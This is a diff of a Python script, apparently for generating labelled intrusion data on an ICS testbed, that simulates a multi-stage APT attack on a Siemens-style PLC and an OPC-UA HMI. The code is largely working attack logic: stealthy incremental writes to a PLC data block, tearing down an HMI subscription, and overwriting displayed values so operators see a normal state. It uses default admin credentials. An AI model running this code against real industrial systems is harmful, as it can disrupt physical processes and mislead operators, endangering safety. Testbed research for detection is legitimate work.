@@ -9,8 +9,9 @@ Multi-stage attack giả lập APT tấn công ICS:
 
 Gọi từ bash:
   python -m attacks_ext.kill_chain \
-      --target 192.168.1.10 --rack 0 --slot 1 \
-      --opc-url opc.tcp://192.168.1.20:4840 \
+      --target 192.168.210.211 --rack 0 --slot 1 \
+      --opc-url opc.tcp://192.168.210.211:4840 \
+      --db-num 1 \
       --session-id bt_s1 --host-id attacker_host \
       --label-file labels/day7_timeline.csv
 """
@@ -77,45 +78,58 @@ def stage2_rogue_access(plc, target, rack, slot):
         print(f"  [ERR] {e}")
 
 
-def stage3_covert_write(plc):
+def stage3_covert_write(plc, db_num):
     log_stage(3, "Ghi giá trị sai vào PLC nhưng trong ngưỡng bình thường (stealthy)")
+    original = None
     try:
-        current = plc.db_read(1, 0, 10)
-        print(f"  [READ] DB1 hiện tại: {current[:10].hex()}")
-        modified = bytearray(current)
+        original = plc.db_read(db_num, 0, 10)
+        print(f"  [READ] DB{db_num} hiện tại: {original[:10].hex()}")
+        modified = bytearray(original)
         original_byte = modified[2]
         modified[2] = min(original_byte + 3, 255)
-        plc.db_write(1, 0, bytes(modified[:10]))
-        print(f"  [WRITE] DB1 byte[2]: {original_byte} -> {modified[2]} (delta=+3, stealthy)")
+        plc.db_write(db_num, 0, bytes(modified[:10]))
+        print(f"  [WRITE] DB{db_num} byte[2]: {original_byte} -> {modified[2]} (delta=+3, stealthy)")
         for i in range(3):
             time.sleep(4)
             modified[2] = min(modified[2] + 1, 255)
-            plc.db_write(1, 0, bytes(modified[:10]))
+            plc.db_write(db_num, 0, bytes(modified[:10]))
             print(f"  [WRITE] Iteration {i+1}: byte[2] = {modified[2]}")
         print(f"  [*] Covert write hoàn tất")
     except Exception as e:
         print(f"  [ERR] {e}")
+    finally:
+        if original is not None:
+            try:
+                plc.db_write(db_num, 0, bytes(original[:10]))
+                print(f"  [RESTORE] DB{db_num} khôi phục: {original[:10].hex()}")
+            except Exception as e:
+                print(f"  [ERR] Restore thất bại, cần khôi phục thủ công DB{db_num}: {e}")
 
 
 def stage4_alarm_suppress(opc_client):
-    log_stage(4, "Xóa OPC-UA subscription để tắt cảnh báo trên HMI")
+    # Testbed has no dedicated Alarms & Conditions node (config/opcua_tags.yaml
+    # only defines process tags) -- this stage demonstrates the real,
+    # observable effect (HMI stops receiving datachange notifications while
+    # a subscription is torn down), using real process tags as the target
+    # instead of fictional alarm node IDs.
+    log_stage(4, "Xóa OPC-UA subscription để HMI ngừng nhận cập nhật trạng thái")
     try:
         sub = opc_client.create_subscription(500, handler=None)
         print(f"  [SUB] Tạo subscription ID: {sub.subscription_id}")
-        time.sleep(2)
-        sub.delete()
-        print(f"  [DELETE] Đã xóa subscription - HMI mù cảnh báo!")
-        alarm_nodes = [
-            "ns=2;s=PLC.Alarms.HighLevel",
-            "ns=2;s=PLC.Alarms.LowPressure",
+        watched_nodes = [
+            'ns=3;s="BangTai"',
+            'ns=3;s="HienThi"',
         ]
-        for node_id in alarm_nodes:
+        for node_id in watched_nodes:
             try:
                 node = opc_client.get_node(node_id)
-                node.set_value(False)
-                print(f"  [SUPPRESS] {node_id} <- False")
+                sub.subscribe_data_change(node)
+                print(f"  [WATCH] {node_id}")
             except Exception as e:
                 print(f"  [WARN] {node_id}: {e}")
+        time.sleep(2)
+        sub.delete()
+        print(f"  [DELETE] Đã xóa subscription - HMI ngừng nhận cập nhật cho {watched_nodes}!")
         time.sleep(5)
     except Exception as e:
         print(f"  [ERR] {e}")
@@ -123,9 +137,12 @@ def stage4_alarm_suppress(opc_client):
 
 def stage5_fake_display(opc_client):
     log_stage(5, "Ghi đè giá trị hiển thị - operator thấy 'bình thường'")
+    # Real process tags from config/opcua_tags.yaml, not fictional Tank/Pump
+    # nodes. hien_thi=0 means "no products counted" (plausible idle state);
+    # bang_tai=True falsely shows the conveyor still running.
     fake_values = [
-        {"node_id": "ns=2;s=PLC.Tank1.Level",  "fake": 50.0},
-        {"node_id": "ns=2;s=PLC.Pump1.Status", "fake": True},
+        {"node_id": 'ns=3;s="HienThi"', "fake": 0},
+        {"node_id": 'ns=3;s="BangTai"', "fake": True},
     ]
     try:
         for _ in range(8):
@@ -171,7 +188,7 @@ def run(args):
         stage2_rogue_access(plc, args.target, args.rack, args.slot)
         time.sleep(3)
         if plc.get_connected():
-            stage3_covert_write(plc)
+            stage3_covert_write(plc, args.db_num)
         time.sleep(3)
         stage4_alarm_suppress(opc)
         time.sleep(3)
@@ -198,12 +215,13 @@ def run(args):
 
 def main():
     p = base_parser("Full ICS Kill Chain Simulation")
-    p.add_argument("--target", default="192.168.1.10")
+    p.add_argument("--target", default="192.168.210.211")
     p.add_argument("--rack", type=int, default=0)
     p.add_argument("--slot", type=int, default=1)
-    p.add_argument("--opc-url", default="opc.tcp://192.168.1.20:4840")
+    p.add_argument("--opc-url", default="opc.tcp://192.168.210.211:4840")
     p.add_argument("--opc-username", default="admin")
     p.add_argument("--opc-password", default="admin123")
+    p.add_argument("--db-num", type=int, default=1, help="DB number for stage 3 covert write -- confirm this is a safe, unused test block in TIA Portal before running")
     args = p.parse_args()
     run(args)
 
